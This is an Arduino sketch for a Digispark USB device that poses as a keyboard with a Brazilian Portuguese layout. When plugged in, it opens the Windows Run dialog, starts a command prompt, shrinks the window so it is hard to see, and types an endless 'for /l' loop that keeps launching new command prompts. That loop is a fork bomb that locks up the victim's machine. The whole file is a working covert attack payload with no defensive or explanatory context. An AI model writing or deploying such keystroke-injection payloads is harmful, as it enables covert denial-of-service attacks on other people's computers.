#include "DigiKeyboardPtBr.h"

void setup() {
}

void loop() {
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("cmd");
  DigiKeyboardPtBr.delay(500);
  //Esconde o Terminal
  DigiKeyboardPtBr.println("MODE CON: COLS=15 LINES=1");
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.println("COLOR EF");
  //Ativa the fork bomb
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print(F("for /l %x in (0,0,0) do start"));
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);

  for (;;) {}
}
